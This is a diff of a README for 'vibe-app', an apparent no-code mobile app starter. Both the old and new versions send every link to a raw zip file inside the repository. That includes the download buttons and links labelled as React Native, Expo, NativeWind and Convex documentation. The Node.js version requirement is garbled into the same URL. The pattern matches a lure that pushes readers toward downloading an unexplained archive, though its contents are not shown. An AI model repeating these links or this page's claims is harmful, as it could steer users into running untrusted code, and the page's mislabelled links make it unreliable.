@@ -1,7 +1,7 @@
 # 🎉 vibe-app - Your Easy Mobile App Starter
 
 ## 🔗 Download the Latest Release
-[![Download Latest Release](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip%20Latest%20Release-vibe--app-brightgreen)](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip%20Latest%20Release-vibe--app-brightgreen)](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the vibe-app! This application is designed to help anyone create mobile apps without the need for programming skills. Whether you want to build for Android or iOS, this starter kit has you covered.
@@ -15,14 +15,14 @@ Welcome to the vibe-app! This application is designed to help anyone create mobi
 ## 🛠️ System Requirements
 To run vibe-app smoothly, ensure your device meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip** Version 14 or later
+- **https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip** Version 14 or later
 - **npm:** Version 6 or later
 - **Expo Go App:** Available on both Android and iOS
 
 ## 📥 Download & Install
 To get started, visit the page below to download the latest version of vibe-app.
 
-[Download Latest Release](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip)
+[Download Latest Release](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip)
 
 ### Step-by-Step Installation:
 1. **Visit the Releases Page:** Click the link above to go to the releases page.
@@ -63,10 +63,10 @@ This project covers a range of topics related to mobile app development:
 Feel free to explore these areas as you build your application with vibe-app. 
 
 ## 🔗 Additional Resources
-- [React Native Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip)
-- [Expo Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip)
-- [NativeWind Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip)
-- [Convex Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/convex/vibe_app_v2.0.zip)
+- [React Native Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip)
+- [Expo Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip)
+- [NativeWind Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip)
+- [Convex Documentation](https://raw.githubusercontent.com/swapnil2805/vibe-app/main/components/app-vibe-v3.6.zip)
 
 Visit the links for in-depth learning and tutorials to enhance your app-making skills.
 
